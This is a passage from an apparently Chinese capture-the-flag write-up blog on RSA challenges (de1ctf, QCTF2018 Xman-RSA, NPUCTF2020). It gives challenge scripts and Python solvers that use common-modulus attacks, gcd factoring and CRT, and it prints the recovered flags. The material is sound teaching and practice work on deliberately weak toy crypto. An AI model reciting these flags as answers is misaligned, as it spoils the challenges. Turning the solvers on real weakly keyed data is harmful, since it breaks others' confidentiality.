class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>nn <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>aa <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>nn<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>nn<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q2<span class="token punctuation">)</span>a1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> p <span class="token operator">*</span> q1<span class="token punctuation">)</span> <span class="token operator">%</span> q1a2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> p <span class="token operator">*</span> q2<span class="token punctuation">)</span> <span class="token operator">%</span> q2aa<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a1<span class="token punctuation">)</span>aa<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exCRT_getequation</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    a1 <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    n1 <span class="token operator">=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    le <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> le<span class="token punctuation">)</span><span class="token punctuation">:</span>        a2 <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        n2 <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> merge<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        a1 <span class="token operator">=</span> a3        n1 <span class="token operator">=</span> n3    <span class="token keyword">return</span> <span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>m14<span class="token punctuation">,</span> n <span class="token operator">=</span> exCRT_getequation<span class="token punctuation">(</span>aa<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>  <span class="token comment"># 最终方程组 aa=n^14%q1*q2</span>m2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m14<span class="token punctuation">,</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="QCTF2018-Xman-RSA"><a href="#QCTF2018-Xman-RSA" class="headerlink" title="[QCTF2018]Xman-RSA"></a>[QCTF2018]Xman-RSA</h4><p>纳尼，没给出加密脚本？哦，原来是加密脚本也加密了。。。</p><p>看起来第一步是进行词频分析呀，这么大的内容</p><p><img src="/2021/05/28/CTF/image-20210729211301798.png" alt></p><p>把第一个再拿出来改一改就行了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> is_prime<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">bytes_to_num</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">num_to_bytes</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    b <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> b <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">else</span> b    <span class="token keyword">return</span> b<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_a_prime</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    random_seed <span class="token operator">=</span> urandom<span class="token punctuation">(</span>l<span class="token punctuation">)</span>    num <span class="token operator">=</span> bytes_to_num<span class="token punctuation">(</span>random_seed<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> is_prime<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    num <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> num<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> bytes_to_num<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">return</span> num_to_bytes<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">separate</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">4</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span>    <span class="token keyword">return</span> t <span class="token operator">==</span> <span class="token number">1</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> <span class="token string">""</span>msg2 <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> separate<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>        msg2 <span class="token operator">+=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        msg1 <span class="token operator">+=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>p1 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>p3 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>n1 <span class="token operator">=</span> p1 <span class="token operator">*</span> p2n2 <span class="token operator">=</span> p1 <span class="token operator">*</span> p3e <span class="token operator">=</span> <span class="token number">0x1001</span>c1 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>c2 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span>e1 <span class="token operator">=</span> <span class="token number">0x1001</span>e2 <span class="token operator">=</span> <span class="token number">0x101</span>p4 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>p5 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>n3 <span class="token operator">=</span> p4 <span class="token operator">*</span> p5c1 <span class="token operator">=</span> num_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> num_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>num_to_bytes<span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>num_to_bytes<span class="token punctuation">(</span>n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是分析了，脚本很简单，先共模攻击获得n1，然后n2也可以有了，然后有msg1、msg2，然后根据他的分离的判定条件将两部分msg合并一下就行了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span> bytes_to_long<span class="token triple-quoted-string string">"""def bytes_to_num(b):    return int(b.encode('hex'), 16)def num_to_bytes(n):    b = hex(n)[2:-1]    b = '0' + b if len(b) % 2 == 1 else b    return b.decode('hex')def get_a_prime(l):    random_seed = urandom(l)    num = bytes_to_num(random_seed)    while True:        if is_prime(num):            break    num += 1    return numdef encrypt(s, e, n):    p = bytes_to_num(s)    p = pow(p, e, n)    return num_to_bytes(p).encode('hex')def separate(n):    p = n % 4    t = (p * p) % 4    return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = ""msg2 = ""for i in range(len(flag)):    if separate(i):        msg2 += flag[i]    else:        msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1 * p2n2 = p1 * p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)# 下面的对n1加密，使用相同的n3，不同的e，可以使用共模攻击来打。e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4 * p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3)))"""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'n2&amp;n3'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    n2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    n3 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'n1.encrypted'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    c1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    c2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">0x1001</span>e1 <span class="token operator">=</span> <span class="token number">0x1001</span>e2 <span class="token operator">=</span> <span class="token number">0x101</span>n <span class="token operator">=</span> n3<span class="token keyword">def</span> <span class="token function">ext_euclid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = gcd(a, b) = gcd(b, a%b)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q<span class="token keyword">def</span> <span class="token function">same_mod</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    n1 <span class="token operator">=</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n  <span class="token comment"># powmod进行大数运算</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n1 ='</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span>    <span class="token keyword">return</span> n1n1 <span class="token operator">=</span> same_mod<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n2 ='</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>p1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>p2 <span class="token operator">=</span> n1 <span class="token operator">//</span> p1p3 <span class="token operator">=</span> n2 <span class="token operator">//</span> p1phi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>phi2 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p3<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi2<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ciphertext'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    c1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    c2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span>msg2 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">separate</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">4</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span>    <span class="token keyword">return</span> t <span class="token operator">==</span> <span class="token number">1</span>flag <span class="token operator">=</span> <span class="token string">''</span>f1 <span class="token operator">=</span> <span class="token number">0</span>f2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>msg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> separate<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> msg2<span class="token punctuation">[</span>f2<span class="token punctuation">]</span>        f2 <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> msg1<span class="token punctuation">[</span>f1<span class="token punctuation">]</span>        f1 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NPUCTF2020-认清形势，建立信心"><a href="#NPUCTF2020-认清形势，建立信心" class="headerlink" title="[NPUCTF2020]认清形势，建立信心"></a>[NPUCTF2020]认清形势，建立信心</h4><p>给出的题目的脚本为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token comment"># Hidden</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"npuctf&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''169169912654178128509160179202518818742414340358553002064450'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据第二、三、四的内容可以很简单地求得<code>n</code>、<code>e</code>，解题脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> sympy<span class="token triple-quoted-string string">"""p = getPrime(25)e = # Hiddenq = getPrime(25)n = p * qm = bytes_to_long(flag.strip(b"npuctf&#123;").strip(b"&#125;"))c = pow(m, e, n)print(c)print(pow(2, e, n))print(pow(4, e, n))print(pow(8, e, n))"""</span>c <span class="token operator">=</span> <span class="token number">169169912654178</span>c2 <span class="token operator">=</span> <span class="token number">128509160179202</span>c4 <span class="token operator">=</span> <span class="token number">518818742414340</span>c8 <span class="token operator">=</span> <span class="token 